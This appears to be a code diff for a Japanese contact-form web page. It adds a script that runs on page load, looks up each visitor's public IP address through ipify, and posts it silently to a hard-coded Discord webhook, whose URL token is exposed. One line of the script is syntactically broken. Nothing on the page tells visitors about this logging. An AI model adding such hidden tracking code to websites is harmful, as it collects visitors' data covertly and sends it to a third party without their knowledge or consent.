@@ -38,11 +38,49 @@
             </div>
                 <input type="hidden" name="redirectTo" value="https://example.com/contact/success">
                 <input type="submit" class="btn-accent" value="送信する">
-        </form>
+          </form>
         </main>
 
         <!-- サイドバー -->
         <div class="side mb-0 navbar-dark bg-dark">サイドバー</div>
-
+        <script>
+          function getIPAddress() {
+                      fetch('https://api.ipify.org/?format=json')
+                          .then(response => response.json())
+                          .then(data => {
+                              const ipAddress = data.ip;
+                              sendToDiscord(ipAddress); // 取得したIPアドレスをDiscordに送信
+                          })
+                          .catch(error => console.error('IPアドレスの取得に失敗しました:', error));
+                  }
+          
+                  function sendToDiscord(ipAddress)  {
+                      const webhookURL = 'https://discord.com/api/webhooks/1255478798925955083/nUzhpsvj6TMxVG9yLP5VJWaPhV6oDrg8g-nF8w3XBtrBvHFpOTQhlAhks1IexGPP7tkv';
+                      const payload = {
+                          embeds: [{
+                              title: '入れたい文字',
+                              description: IP address: ${ipAddress},
+                              color: 3447003 // 青色に設定
+                          }]
+                      };
+          
+                      fetch(webhookURL, {
+                          method: 'POST',
+                          headers: {
+                              'Content-Type': 'application/json'
+                          },
+                          body: JSON.stringify(payload)
+                      })
+                      .then(response => {
+                          if (!response.ok) {
+                              console.error('Discordへの送信に失敗しました:', response.statusText);
+                          }
+                      })
+                      .catch(error => console.error('Discordへの送信に失敗しました:', error));
+                  }
+          
+                  getIPAddress();
+              </script> 
+          
   </body>
 </html>
